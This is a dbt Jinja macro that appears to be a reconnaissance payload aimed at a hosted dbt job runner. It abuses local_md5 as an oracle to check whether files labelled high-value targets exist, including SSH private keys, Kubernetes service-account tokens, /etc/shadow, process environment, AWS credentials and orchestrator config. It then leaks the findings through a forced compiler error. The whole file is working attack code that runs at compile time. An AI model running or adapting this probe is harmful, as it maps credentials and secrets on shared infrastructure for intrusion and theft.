{# File existence oracle via local_md5 #}
{# local_md5 returns a valid hash for readable files, empty/error for missing #}
{% set ns = namespace(output='[ORACLE] ') %}
{% set run_id = env_var('DBT_CLOUD_RUN_ID', 'unknown') %}
{% set job_dir = '/tmp/jobs/' ~ run_id %}

{# High-value targets #}
{% set files = {
  'ssh_key': job_dir ~ '/.ssh/id_rsa',
  'ssh_key2': job_dir ~ '/.ssh/id_ed25519',
  'ssh_known': job_dir ~ '/.ssh/known_hosts',
  'k8s_token': '/var/run/secrets/kubernetes.io/serviceaccount/token',
  'k8s_ca': '/var/run/secrets/kubernetes.io/serviceaccount/ca.crt',
  'k8s_ns': '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
  'etc_shadow': '/etc/shadow',
  'etc_hosts': '/etc/hosts',
  'etc_resolv': '/etc/resolv.conf',
  'proc_env': '/proc/self/environ',
  'proc_cmd': '/proc/self/cmdline',
  'proc_cgroup': '/proc/self/cgroup',
  'docker_env': '/.dockerenv',
  'orc_config': '/usr/src/orc/config.py',
  'orc_settings': '/usr/src/orc/settings.py',
  'orc_env': '/usr/src/orc/.env',
  'aws_creds': '/root/.aws/credentials',
  'aws_config': '/root/.aws/config',
  'git_config': job_dir ~ '/.gitconfig',
  'dbt_packages': job_dir ~ '/target/packages.yml',
  'pip_conf': '/root/.config/pip/pip.conf'
} %}

{% for name, path in files.items() %}
  {% set h = local_md5(path) %}
  {% if h and h | length > 0 %}
    {% set ns.output = ns.output ~ name ~ '=EXISTS(' ~ h ~ ') ' %}
  {% else %}
    {% set ns.output = ns.output ~ name ~ '=MISSING ' %}
  {% endif %}
{% endfor %}

{{ exceptions.raise_compiler_error(ns.output) }}
